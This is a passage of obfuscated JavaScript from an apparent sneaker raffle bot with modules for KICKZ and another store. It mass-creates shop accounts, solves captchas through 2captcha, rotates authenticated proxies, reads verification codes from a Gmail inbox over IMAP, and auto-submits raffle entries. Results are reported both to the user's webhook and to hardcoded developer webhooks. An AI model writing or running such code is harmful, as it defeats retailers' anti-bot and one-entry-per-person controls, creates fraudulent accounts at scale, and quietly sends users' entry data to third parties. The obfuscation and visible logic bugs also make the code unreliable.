                        console['log'](_0xd645bd() + '\x20[' + _0x29c4ae['name'] + ']\x20Task\x20' + (_0x35323d + 0x1) + '\x20:\x20Filling\x20Information'), await _0x219b99['type']('#comp_firstname', '' + _0x1b89c0[_0x35323d]['FirstName']), await _0x219b99['waitForSelector']('#comp_lastname'), await _0x219b99['type']('#comp_lastname', '' + _0x1b89c0[_0x35323d]['LastName']), await _0x219b99['waitForSelector']('#comp_email'), await _0x219b99['type']('#comp_email', '' + _0x1b89c0[_0x35323d]['Email']), await _0x219b99['waitForSelector']('#comp_paypalemail'), await _0x219b99['type']('#comp_paypalemail', '' + _0x1b89c0[_0x35323d]['Email']), await _0x219b99['waitForSelector']('#comp_mobile_end'), await _0x219b99['type']('#comp_mobile_end', '' + _0x1b89c0[_0x35323d]['Phone']), await _0x219b99['waitForSelector']('#comp_dob'), await _0x219b99['type']('#comp_dob', '08/09/1992'), console['log'](_0xd645bd() + '\x20[' + _0x29c4ae['name'] + ']\x20Task\x20' + (_0x35323d + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x1b89c0[_0x35323d]['Size'] == 'RANDOM') {
                            const _0x38bc7b = await _0x219b99['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x3b6164 => {
                                return _0x3b6164['map'](_0xfb32f5 => _0xfb32f5['value']);
                            });
                            var _0x2b20e4 = Math['round'](Math['random']() * (_0x38bc7b['length'] - 0x2));
                            await _0x219b99['select']('#shoesize', _0x38bc7b[_0x2b20e4 + 0x1]), await _0x90116b(0x3e8);
                        } else {
                            const _0x51b657 = await _0x219b99['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x3e3f87 => {
                                return _0x3e3f87['map'](_0x14baa8 => _0x14baa8['innerText']);
                            }), _0x385688 = await _0x219b99['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x34c6a4 => {
                                return _0x34c6a4['map'](_0x5c24c4 => _0x5c24c4['value']);
                            });
                            var _0x5817b9 = _0x1b89c0[_0x35323d]['Size'];
                            for (var _0x11452a = 0x1; _0x11452a < _0x385688['length']; _0x11452a++) {
                                var _0x1145ba = _0x51b657[_0x11452a]['split']('\x20')[0x0];
                                if (_0x1145ba == _0x5817b9) {
                                    await _0x219b99['select']('#shoesize', _0x385688[_0x11452a]);
                                    break;
                                } else {
                                    if (_0x11452a + 0x1 == _0x385688['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x219b99['waitForSelector']('#comp_address1'), await _0x219b99['type']('#comp_address1', _0x1b89c0[_0x35323d]['Address1'] + '\x20' + _0x1b89c0[_0x35323d]['HouseNumber']), await _0x219b99['waitForSelector']('#comp_address2'), await _0x219b99['type']('#comp_address2', '' + _0x1b89c0[_0x35323d]['Address2']), await _0x219b99['waitForSelector']('#comp_address2'), await _0x219b99['type']('#comp_address3', '' + _0x1b89c0[_0x35323d]['City']), await _0x219b99['waitForSelector']('#comp_postcode'), await _0x219b99['type']('#comp_postcode', '' + _0x1b89c0[_0x35323d]['Zip']), console['log'](_0xd645bd() + '\x20[' + _0x29c4ae['name'] + ']\x20Task\x20' + (_0x35323d + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x90116b(0x4b0), await _0x219b99['click']('label#emailhold'), await _0x90116b(0x5dc), await _0x219b99['click']('#preauth_tandc_email\x20>\x20label'), await _0x90116b(0x5dc), await _0x219b99['click']('#submit'), await _0x219b99['waitForSelector']('#paymentWrap'), console['log'](_0xd645bd() + '\x20[' + _0x29c4ae['name'] + ']\x20Task\x20' + (_0x35323d + 0x1) + '\x20:\x20' + _0x5bbbd3['blue']('Awaiting\x20Paypal\x20Payment')), _0x49f4ff['on']('targetcreated', async _0x12345b => {
                            if (_0x12345b['type']() === 'page') {
                                const _0x3cd203 = await _0x12345b['page']();
                                async function _0x734050() {
                                    try {
                                        await _0x219b99['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x3a6d77 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x352b5a() {
                                    try {
                                        await _0x219b99['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0xac2004 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x352b5a(), _0x734050(), await _0x90116b(0x493e0);
                            }
                        });
                        async function _0x47af0f() {
                            for (let _0x5e65d9 = 0x0; _0x5e65d9 < 0x12c; _0x5e65d9++) {
                                if (_0xac2004 == !![]) {
                                    _0x1e6f87 = 'no', _0x2812a5(_0x1b89c0[_0x35323d], _0x29c4ae), console['log'](_0x5bbbd3['green'](_0xd645bd() + '\x20[' + _0x29c4ae['name'] + ']\x20Task\x20' + (_0x35323d + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '')
                                        try {
                                            await _0x2860ef(_0x474e1d['webhook'], _0x36e122['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x90116b(0xc8), await _0x2860ef(_0x5e16d4, _0x36e122['succesDEVMSG']), await _0x90116b(0xc8);
                                    try {
                                        await _0x2860ef(_0x3c50b7, _0x36e122['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x3a6d77)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x90116b(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x90116b(0xbb8), await _0x219b99['click']('.zoid-outlet'), await _0x90116b(0x7d0), await _0x47af0f();
                    } catch (_0x2dce10) {
                        console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x29c4ae['name'] + ']\x20Task\x20' + (_0x35323d + 0x1) + '\x20:\x20' + _0x2dce10)), _0x75ead7 = '' + _0x2dce10;
                        var _0x17b2dc = await _0x476a56(_0x1b89c0[_0x35323d], _0x29c4ae, 'dev', !![], _0x75ead7);
                        _0x36e122['errorDEV'] = { 'embeds': [_0x17b2dc] }, _0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '' && await _0x2860ef(_0x474e1d['webhook'], _0x36e122['errorDEV']), await _0x2860ef(_0x406b45, _0x36e122['errorDEV']);
                    } finally {
                        _0x49f4ff && _0x49f4ff['close']();
                        if (_0x1e6f87 == 'yes' && _0xb18d1e != 0x5 && _0x75ead7 != 'Size\x20Not\x20Found') {
                            console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x29c4ae['name'] + ']\x20Task\x20' + (_0x35323d + 0x1) + '\x20:\x20Retrying')), _0x35323d = _0x35323d - 0x1, _0xb18d1e = _0xb18d1e + 0x1;
                            continue;
                        }
                        _0x1e6f87 == 'yes' && _0xb18d1e >= 0x5 && (_0x78fa55(afew[_0x35323d], _0x29c4ae), _0x1e6f87 = 'no', _0xb18d1e = 0x0), console['log']('Waiting\x20for\x20' + _0x474e1d['delay'] + '\x20ms'), await _0x90116b(_0x474e1d['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x50f4a6, _0x38cd6d, _0x568d11) {
                    _0x51bd0a['use'](_0x5a6562()), _0x51bd0a['use'](_0x2f2194({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x474e1d['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x51a6ee = 0x0; _0x51a6ee < _0x38cd6d['length']; _0x51a6ee++) {
                        const _0x28d057 = 'https://www.kickz.com/login';
                        if (_0xd6651f != 'yes')
                            var _0xd6651f = '', _0xcc3ec1 = 0x0;
                        _0x4e8779(_0x50f4a6['name'] + '\x20Task\x20' + (_0x51a6ee + 0x1) + '\x20/\x20' + _0x38cd6d['length'] + '\x20||\x20File:\x20' + _0x10c107 + '\x20Proxies:\x20' + _0x68d2dc), await _0x526adb(_0x38cd6d, _0x51a6ee);
                        var _0x56a546 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x54e6a5
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x474e1d['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x1144ef
                                }
                            ]
                        }];
                        const _0x215292 = { 'embeds': _0x56a546 };
                        var _0x335ca8 = await _0x476a56(_0x38cd6d[_0x51a6ee], _0x50f4a6, 'acc', ![]);
                        const _0x21136d = { 'succesDEVMSG': { 'embeds': [_0x335ca8] } };
                        if (_0x38cd6d[_0x51a6ee]['Email'] == '' || _0x38cd6d[_0x51a6ee]['FirstName'] == '' || _0x38cd6d[_0x51a6ee]['LastName'] == '') {
                            console['log'](_0xd645bd() + '\x20[' + _0x50f4a6['name'] + ']\x20Task\x20' + (_0x51a6ee + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x38cd6d[_0x51a6ee]['Password'] == '' && (_0x38cd6d[_0x51a6ee]['Password'] = 'JRaffles23!');
                        if (_0x474e1d['useRandomProxy'] = ![])
                            var _0x111835 = _0x568d11[_0x51a6ee]['split'](':');
                        else
                            var _0x2efd87 = Math['round'](Math['random']() * (_0x568d11['length'] - 0x1)), _0x111835 = _0x568d11[_0x2efd87]['split'](':');
                        const _0x20e6ae = await _0x51bd0a['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x111835[0x0] + ':' + _0x111835[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x1887a5 = await _0x20e6ae['newPage']();
                            await _0x1887a5['authenticate']({
                                'username': '' + _0x111835[0x2],
                                'password': '' + _0x111835[0x3]
                            }), console['log'](_0xd645bd() + '\x20[' + _0x50f4a6['name'] + ']\x20Task\x20' + (_0x51a6ee + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1887a5['setRequestInterception'](!![]), _0x1887a5['on']('request', _0x41e112 => {
                                _0x41e112['resourceType']() === 'image' || _0x41e112['resourceType']() === 'font' || _0x41e112['resourceType']() === 'media' ? _0x41e112['abort']() : _0x41e112['continue']();
                            }), await _0x1887a5['goto'](_0x28d057), await _0x90116b(0xbb8), console['log'](_0xd645bd() + '\x20[' + _0x50f4a6['name'] + ']\x20Task\x20' + (_0x51a6ee + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x1887a5['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x1887a5['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x1887a5['waitForSelector']('#button-register'), await _0x90116b(0x7d0), await _0x1887a5['evaluate'](() => {
                                const _0x16103c = document['querySelector']('#button-register');
                                _0x16103c['click']();
                            }), console['log'](_0xd645bd() + '\x20[' + _0x50f4a6['name'] + ']\x20Task\x20' + (_0x51a6ee + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x90116b(0x1388), await _0x1887a5['waitForSelector']('#customer_salutation'), await _0x1887a5['select']('#customer_salutation', 'mr'), await _0x90116b(0x7d0), await _0x1887a5['waitForSelector']('#customer_firstname'), await _0x1887a5['type']('#customer_firstname', '' + _0x38cd6d[_0x51a6ee]['FirstName']), await _0x90116b(0x352), await _0x1887a5['waitForSelector']('#customer_lastname'), await _0x1887a5['type']('#customer_lastname', '' + _0x38cd6d[_0x51a6ee]['LastName']), await _0x90116b(0x352), await _0x1887a5['type']('#email-input', '' + _0x38cd6d[_0x51a6ee]['Email']), await _0x90116b(0x352), await _0x1887a5['type']('#email-confirm-input', '' + _0x38cd6d[_0x51a6ee]['Email']), await _0x90116b(0x352), await _0x1887a5['type']('#register-password', '' + _0x38cd6d[_0x51a6ee]['Password']), await _0x90116b(0x352), await _0x1887a5['type']('#password-confirm', '' + _0x38cd6d[_0x51a6ee]['Password']), await _0x90116b(0x352), console['log'](_0xd645bd() + '\x20[' + _0x50f4a6['name'] + ']\x20Task\x20' + (_0x51a6ee + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x1887a5['click']('#consent'), await _0x90116b(0x1f4);
                            const _0x4a9943 = await _0x1887a5['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x4a9943) {
                                console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x50f4a6['name'] + ']\x20Task\x20' + (_0x51a6ee + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x1887a5['click']('#buttonRegister');
                            try {
                                await _0x1887a5['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0xd645bd() + '\x20[' + _0x50f4a6['name'] + ']\x20Task\x20' + (_0x51a6ee + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x38cd6d[_0x51a6ee]['Email']), await _0x90116b(0x4b0);
                            async function _0x260924() {
                                var _0x304671, _0x488032 = ![];
                                for (var _0x46e1c1 = 0x0; _0x46e1c1 < 0x18; _0x46e1c1++) {
                                    async function _0x477f8b() {
                                        var _0xeab07d = new _0x59e93a({
                                            'user': _0x474e1d['masterMail'],
                                            'password': _0x474e1d['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x2f34e(_0x382df8) {
                                            _0xeab07d['openBox']('INBOX', ![], _0x382df8);
                                        }
                                        _0xeab07d['once']('ready', function () {
                                            console['log'](_0xd645bd() + '\x20[' + _0x50f4a6['name'] + ']\x20Task\x20' + (_0x51a6ee + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x2f34e(function (_0x5eb983, _0x266a51) {
                                                console['log'](_0xd645bd() + '\x20[' + _0x50f4a6['name'] + ']\x20Task\x20' + (_0x51a6ee + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x5eb983)
                                                    throw _0x5eb983;
                                                _0xeab07d['seq']['search'](['UNSEEN'], function (_0x254b8c, _0x4e7771) {
                                                    if (!_0x4e7771 || !_0x4e7771['length'])
                                                        console['log'](_0xd645bd() + '\x20[' + _0x50f4a6['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0xeab07d['end']();
                                                    else {
                                                        var _0x30abda = _0xeab07d['seq']['fetch'](_0x4e7771, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x30abda['on']('message', function (_0x56e721, _0x87e5a5) {
                                                            var _0x4f588a = '(#' + _0x87e5a5 + ')\x20';
                                                            _0x56e721['on']('body', function (_0x5d8819, _0x5be87a) {
                                                                _0x2cd09b(_0x5d8819, (_0x505a88, _0x1147d0) => {
                                                                    if (_0x1147d0['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x1f94ae = _0x1147d0['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x32af71 = _0x1f94ae[0x1]['split']('<')[0x0];
                                                                        _0x304671 = _0x32af71;
                                                                    }
                                                                });
                                                            }), _0x56e721['once']('end', function () {
                                                            });
                                                        }), _0x30abda['once']('error', function (_0x2d0659) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x30abda['once']('end', function () {
                                                            _0xeab07d['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0xeab07d['once']('error', function (_0x58f795) {
                                            console['log'](_0x5bbbd3['red'](_0x58f795['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x488032 = !![];
                                        }), _0xeab07d['once']('end', async function () {
                                        }), _0xeab07d['connect']();
                                    }
                                    _0x477f8b(), await _0x90116b(0x1388);
                                    if (_0x304671)
                                        return _0x304671;
                                    if (_0x488032)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x46e1c1 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x260924(), _0x90116b(0x320), console['log'](_0xd645bd() + '\x20[' + _0x50f4a6['name'] + ']\x20Task\x20' + (_0x51a6ee + 0x1) + '\x20:\x20Verifying..'), await _0x1887a5['type']('#verificationCode', code), await _0x90116b(0x1f4), await _0x1887a5['click']('#buttonVerify'), await _0x90116b(0x190), await _0x1887a5['click']('#buttonVerify'), await _0x90116b(0x3e8);
                            try {
                                await _0x1887a5['waitForSelector']('div.b-user_greeting'), _0xd6651f = 'no', console['log'](_0x5bbbd3['green'](_0xd645bd() + '\x20[' + _0x50f4a6['name'] + ']\x20Task\x20' + (_0x51a6ee + 0x1) + '\x20:\x20Account\x20' + _0x38cd6d[_0x51a6ee]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x396fe9['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x38cd6d[_0x51a6ee]['Email'] + ',' + _0x38cd6d[_0x51a6ee]['Password'] + ','), console['log'](_0xd645bd() + '\x20[' + _0x50f4a6['name'] + ']\x20Task\x20' + (_0x51a6ee + 0x1) + '\x20:\x20Account\x20' + _0x38cd6d[_0x51a6ee]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '' && await _0x2860ef(_0x474e1d['webhook'], _0x21136d['succesDEVMSG']);
                                } catch {
                                }
                                await _0x2860ef(_0x29555e, _0x21136d['succesDEVMSG']);
                            } catch {
                                _0xd6651f = 'no', console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x50f4a6['name'] + ']\x20Task\x20' + (_0x51a6ee + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x50f4a6['name'] + ']\x20Task\x20' + (_0x51a6ee + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x30e111) {
                            console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x50f4a6['name'] + ']\x20Task\x20' + (_0x51a6ee + 0x1) + '\x20:\x20' + _0x30e111)), _0x56a546[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x56a546[0x0]['description'] = '' + _0x30e111, await _0x2860ef(_0x406b45, _0x215292), _0xd6651f = 'yes';
                        } finally {
                            _0x20e6ae && _0x20e6ae['close']();
                            if (_0xd6651f == 'yes' && _0xcc3ec1 != 0x5) {
                                console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x50f4a6['name'] + ']\x20Task\x20' + (_0x51a6ee + 0x1) + '\x20:\x20Retrying')), _0x51a6ee = _0x51a6ee - 0x1, _0xcc3ec1 = _0xcc3ec1 + 0x1;
                                continue;
                            }
                            _0xd6651f == 'yes' && _0xcc3ec1 >= 0x5 && (_0x78fa55(_0x38cd6d[_0x51a6ee], _0x50f4a6), _0xd6651f = 'no', _0xcc3ec1 = 0x0), console['log']('Waiting\x20for\x20' + _0x474e1d['delay'] + '\x20ms'), await _0x90116b(_0x474e1d['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x3a0615, _0x535120, _0x365689) {
                    _0x51bd0a['use'](_0x5a6562()), _0x51bd0a['use'](_0x2f2194({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x474e1d['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x76aca1 = 0x0; _0x76aca1 < _0x535120['length']; _0x76aca1++) {
                        var _0x322de1;
                        if (_0x26ae0f != 'yes')
                            var _0x26ae0f = '', _0x4159da = 0x0;
                        _0x4e8779(_0x3a0615['name'] + '\x20Task\x20' + (_0x76aca1 + 0x1) + '\x20/\x20' + _0x535120['length'] + '\x20||\x20File:\x20' + _0x10c107 + '\x20Proxies:\x20' + _0x68d2dc);
                        var _0x105065 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x54e6a5
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x535120[_0x76aca1]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x535120[_0x76aca1]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x474e1d['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x1144ef
                                }
                            ]
                        }], _0x5574db = await _0x476a56(_0x535120[_0x76aca1], _0x3a0615, 'dev', ![]), _0xb29600 = await _0x476a56(_0x535120[_0x76aca1], _0x3a0615, 'pub', ![]);
                        const _0x4d85b6 = {
                            'succesDEVMSG': { 'embeds': [_0x5574db] },
                            'succesPUBMSG': { 'embeds': [_0xb29600] }
                        };
                        await _0x526adb(_0x535120, _0x76aca1);
                        if (_0x535120[_0x76aca1]['Email'] == '' || _0x535120[_0x76aca1]['Password'] == '' || _0x535120[_0x76aca1]['FirstName'] == '' || _0x535120[_0x76aca1]['LastName'] == '') {
                            console['log'](_0xd645bd() + '\x20[' + _0x3a0615['name'] + ']\x20Task\x20' + (_0x76aca1 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x474e1d['useRandomProxy'] = ![])
                            var _0x35ddd6 = _0x365689[_0x76aca1]['split'](':');
                        else
                            var _0x262ccb = Math['round'](Math['random']() * (_0x365689['length'] - 0x1)), _0x35ddd6 = _0x365689[_0x262ccb]['split'](':');
                        const _0x5973b3 = await _0x51bd0a['launch']({
                            'headless': ![],
                            'args': [
                                '--proxy-server=' + _0x35ddd6[0x0] + ':' + _0x35ddd6[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x573b0b = await _0x5973b3['newPage']();
                            await _0x573b0b['authenticate']({
                                'username': '' + _0x35ddd6[0x2],
                                'password': '' + _0x35ddd6[0x3]
                            }), console['log'](_0xd645bd() + '\x20[' + _0x3a0615['name'] + ']\x20Task\x20' + (_0x76aca1 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x573b0b['setRequestInterception'](!![]), _0x573b0b['on']('request', _0x3c06c0 => {
                                _0x3c06c0['resourceType']() === 'image' || _0x3c06c0['resourceType']() === 'font' || _0x3c06c0['resourceType']() === 'media' ? _0x3c06c0['abort']() : _0x3c06c0['continue']();
                            }), await _0x573b0b['goto']('' + _0x535120[_0x76aca1]['Url'], { 'waitUntil': 'networkidle2' }), await _0x90116b(0x12c);
                            try {
                                await _0x573b0b['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x573b0b['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0xd645bd() + '\x20[' + _0x3a0615['name'] + ']\x20Task\x20' + (_0x76aca1 + 0x1) + '\x20:\x20Logging\x20in'), await _0x573b0b['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x573b0b['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x573b0b['waitForSelector']('#username'), await _0x573b0b['type']('#username', _0x535120[_0x76aca1]['Email']), await _0x573b0b['waitForSelector']('#password'), await _0x573b0b['type']('#password', _0x535120[_0x76aca1]['Password']), await _0x90116b(0x190), await _0x573b0b['click']('#buttonSubmit'), await _0x573b0b['waitForSelector']('div.b-user_greeting'), console['log'](_0xd645bd() + '\x20[' + _0x3a0615['name'] + ']\x20Task\x20' + (_0x76aca1 + 0x1) + '\x20:\x20Getting\x20Product'), await _0x90116b(0x1f4), await _0x573b0b['goto']('' + _0x535120[_0x76aca1]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0xd645bd() + '\x20[' + _0x3a0615['name'] + ']\x20Task\x20' + (_0x76aca1 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x535120[_0x76aca1]['Size']);
                            let _0x3c21d7 = _0x535120[_0x76aca1]['Size']['replace']('.5', '\x201/2');
                            await _0x573b0b['click']('button[title=\x22' + _0x3c21d7 + '\x22]'), await _0x90116b(0x1f4);
                            try {
                                await _0x573b0b['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x90116b(0x12c), console['log'](_0xd645bd() + '\x20[' + _0x3a0615['name'] + ']\x20Task\x20' + (_0x76aca1 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x573b0b['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x90116b(0x12c), await _0x573b0b['type']('#dwfrm_raffle_addressFields_firstName', _0x535120[_0x76aca1]['FirstName']), await _0x90116b(0x12c), await _0x573b0b['type']('#dwfrm_raffle_addressFields_lastName', _0x535120[_0x76aca1]['LastName']), await _0x90116b(0x12c), await _0x573b0b['select']('#dwfrm_raffle_addressFields_country', _0x535120[_0x76aca1]['Country']), await _0x90116b(0x12c), await _0x573b0b['type']('#dwfrm_raffle_addressFields_city', _0x535120[_0x76aca1]['City']), await _0x90116b(0x12c);
                            _0x535120[_0x76aca1]['Postcode'] == undefined && (_0x535120[_0x76aca1]['Postcode'] = _0x535120[_0x76aca1]['Zip']);
                            await _0x573b0b['type']('#dwfrm_raffle_addressFields_postalCode', _0x535120[_0x76aca1]['Postcode']), await _0x90116b(0x12c), await _0x573b0b['type']('#dwfrm_raffle_addressFields_address1', _0x535120[_0x76aca1]['Address1']), await _0x90116b(0x12c), await _0x573b0b['type']('#dwfrm_raffle_addressFields_address2', _0x535120[_0x76aca1]['HouseNumber']), await _0x90116b(0x12c), await _0x573b0b['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x535120[_0x76aca1]['Address2']), await _0x90116b(0x12c), await _0x573b0b['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x90116b(0x12c), await _0x573b0b['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x535120[_0x76aca1]['Follower']), await _0x90116b(0x1f4), await _0x573b0b['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x90116b(0x1f4), console['log'](_0xd645bd() + '\x20[' + _0x3a0615['name'] + ']\x20Task\x20' + (_0x76aca1 + 0x1) + '\x20:\x20' + _0x5bbbd3['blue']('Awaiting\x20Paypal\x20Payment')), await _0x573b0b['click']('.b-paypal_button');
                            try {
                                await _0x573b0b['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x26ae0f = 'no', _0x2812a5(_0x535120[_0x76aca1], _0x3a0615), console['log'](_0x5bbbd3['green'](_0xd645bd() + '\x20[' + _0x3a0615['name'] + ']\x20Task\x20' + (_0x76aca1 + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '' && await _0x2860ef(_0x474e1d['webhook'], _0x4d85b6['succesDEVMSG']), await _0x90116b(0xc8), await _0x2860ef(_0x5e16d4, _0x4d85b6['succesDEVMSG']), await _0x90116b(0xc8), await _0x2860ef(_0x3c50b7, _0x4d85b6['succesPUBMSG']);
                            } catch (_0x2e3246) {
                                console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x3a0615['name'] + ']\x20Task\x20' + (_0x76aca1 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x2e3246)), _0x322de1 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x2e3246;
                                var _0x2477f2 = await _0x476a56(_0x535120[_0x76aca1], _0x3a0615, 'dev', !![], _0x322de1);
                                _0x4d85b6['errorDEV'] = { 'embeds': [_0x2477f2] }, _0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '' && await _0x2860ef(_0x474e1d['webhook'], _0x4d85b6['errorDEV']), await _0x2860ef(_0x406b45, _0x4d85b6['errorDEV']);
                            }
                        } catch (_0x55ad42) {
                            console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x3a0615['name'] + ']\x20Task\x20' + (_0x76aca1 + 0x1) + '\x20:\x20' + _0x55ad42)), _0x322de1 = '' + _0x55ad42;
                            var _0x2477f2 = await _0x476a56(_0x535120[_0x76aca1], _0x3a0615, 'dev', !![], _0x322de1);
                            _0x4d85b6['errorDEV'] = { 'embeds': [_0x2477f2] }, _0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '' && await _0x2860ef(_0x474e1d['webhook'], _0x4d85b6['errorDEV']), await _0x2860ef(_0x406b45, _0x4d85b6['errorDEV']), _0x26ae0f = 'yes';
                        } finally {
                            _0x5973b3 && _0x5973b3['close']();
                            if (_0x26ae0f == 'yes' && _0x4159da != 0x5) {
